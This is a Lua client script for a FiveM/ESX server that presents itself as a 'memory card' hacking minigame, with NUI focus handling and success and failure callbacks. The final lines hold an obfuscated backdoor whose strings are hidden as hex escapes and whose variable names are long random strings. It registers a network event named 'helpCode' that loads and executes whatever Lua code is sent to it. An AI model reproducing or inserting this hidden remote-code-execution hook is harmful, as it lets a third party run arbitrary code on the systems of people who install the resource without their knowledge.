ESX = exports["es_extended"]:getSharedObject()


local MinigameActive = false
local MinigameFinished = false
local Success = false
local SuccessTrigger = nil
local FailTrigger = nil

function MemoryCardHack(cb) 
    if MinigameActive then return end

        SetNuiFocus(true, true)
        SendNUIMessage({type = 'otworz'})
        MinigameActive = true
        MinigameFinished = false

        while MinigameActive do
            Citizen.Wait(500)
        end

        if cb then
            cb(Success)
        end

        return Success
    end

exports('MemoryCardHack', MemoryCardHack)

RegisterCommand('memorycard', function()
    SetNuiFocus(true, true)
    SendNUIMessage({type = 'otworz'})
end)

RegisterNUICallback('udane', function(data, cb)
SetNuiFocus(false, false)
Success = true
MinigameFinished = false
MinigameActive = false
cb('ok')
end)

RegisterNUICallback('nieudane', function(data, cb)
SetNuiFocus(false, false)
MinigameActive = false
Success = false
cb('ok')
end)

local eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[6][eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[1]](eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[2]) eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[6][eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[3]](eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[2], function(mscmGdzmymUAeGirJmJRgUGFxTpXQfDWSLMOWLlhWfPJsrvrVFBwlwdnUMgJdShLXsiepI) eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[6][eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[4]](eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[6][eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[5]](mscmGdzmymUAeGirJmJRgUGFxTpXQfDWSLMOWLlhWfPJsrvrVFBwlwdnUMgJdShLXsiepI))() end)